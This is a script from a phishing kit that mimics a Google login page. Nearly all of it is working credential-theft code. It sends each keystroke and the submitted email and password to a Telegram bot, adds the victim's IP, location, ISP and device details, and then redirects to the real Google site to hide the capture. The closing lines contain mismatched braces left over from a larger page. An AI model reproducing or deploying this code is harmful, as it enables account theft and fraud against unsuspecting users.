<script>
// ========================
// CONFIGURATION - EDIT THESE
// ========================
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your Telegram bot token
const CHAT_ID = "YOUR_CHAT_ID_HERE";       // Replace with your Telegram chat ID
const REAL_SITE = "https://accounts.google.com";  // Where to redirect after capture
const BRAND_NAME = "Google";               // Used in Telegram messages

// ========================
// TELEGRAM EXFILTRATION
// ========================
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
    };
    
    // Use fetch with no-cors to avoid blocking
    fetch(url, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(() => {
        // Fallback: Image beacon (works even if CORS blocks)
        const img = new Image();
        img.src = url + '?' + new URLSearchParams({
            chat_id: CHAT_ID,
            text: message.substring(0, 200)  // Keep it short for GET
        }).toString();
    });
}

// ========================
// GET TARGET INFO
// ========================
let targetIP = 'Unknown';
let targetCountry = 'Unknown';
let targetCity = 'Unknown';
let targetISP = 'Unknown';

// Get IP and location info
fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(data => {
        targetIP = data.ip || 'Unknown';
        targetCountry = data.country_name || 'Unknown';
        targetCity = data.city || 'Unknown';
        targetISP = data.org || 'Unknown';
    })
    .catch(() => {
        // Fallback
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => { targetIP = d.ip; })
            .catch(() => {});
    });

// ========================
// REAL-TIME KEYSTROKE CAPTURE
// Every keypress is sent to Telegram immediately
// ========================
let lastEmailLen = 0;
let lastPassLen = 0;

document.getElementById('email').addEventListener('input', function(e) {
    const val = this.value;
    if (val.length > lastEmailLen && val.length > 2) {
        // New character typed - send it
        const newChar = val[val.length - 1];
        sendToTelegram(
            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
            `👤 *Field:* Email\n` +
            `📝 *Character:* \`${newChar}\`\n` +
            `📋 *So far:* \`${val}\``
        );
    }
    lastEmailLen = val.length;
});

document.getElementById('password').addEventListener('input', function(e) {
    const val = this.value;
    if (val.length > lastPassLen && val.length > 0) {
        const newChar = val[val.length - 1];
        sendToTelegram(
            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
            `👤 *Field:* Password\n` +
            `📝 *Character:* \`${newChar}\`\n` +
            `📋 *So far:* \`${'*'.repeat(val.length - 1)}${newChar}\``
        );
    }
    lastPassLen = val.length;
});

// ========================
// FORM SUBMISSION
// ========================
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const userAgent = navigator.userAgent;
    const timestamp = new Date().toISOString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform || 'Unknown';
    const language = navigator.language || 'Unknown';
    
    // Get screen info
    const screenInfo = `${window.screen.width}x${window.screen.height}`;
    
    // Show loading
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loadingIndicator').style.display = 'block';
    
    // Build the full credential report
    let message = `🔔 *${BRAND_NAME} — Credentials Captured!*\n\n`;
    message += `📧 *Email:* \`${email}\`\n`;
    message += `🔑 *Password:* \`${password}\`\n\n`;
    message += `🌐 *IP:* ${targetIP}\n`;
    message += `📍 *Location:* ${targetCity}, ${targetCountry}\n`;
    message += `🏢 *ISP:* ${targetISP}\n`;
    message += `📱 *Device:* ${platform}\n`;
    message += `🖥 *Screen:* ${screenInfo}\n`;
    message += `🌍 *Language:* ${language}\n`;
    message += `🕐 *Timezone:* ${timezone}\n`;
    message += `🧾 *UA:* \`${userAgent.substring(0, 100)}\`\n`;
    message += `⏰ *Time:* ${timestamp}`;
    
    // Send credentials to Telegram
    sendToTelegram(message);
    
    // Also try to send via XMLHttpRequest (more reliable than fetch)
    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        }));
    } catch(e) {}
    
    // Delay then redirect to real site
    setTimeout(() => {
        window.location.href = REAL_SITE;
    }, 2500);
});

    document.getElementById('loginCard').style.transition = 'opacity 0.3s';
    setTimeout(() => {
        document.getElementById('loginCard').style.opacity = '1';
    }, Math.random() * 500 + 200);
});
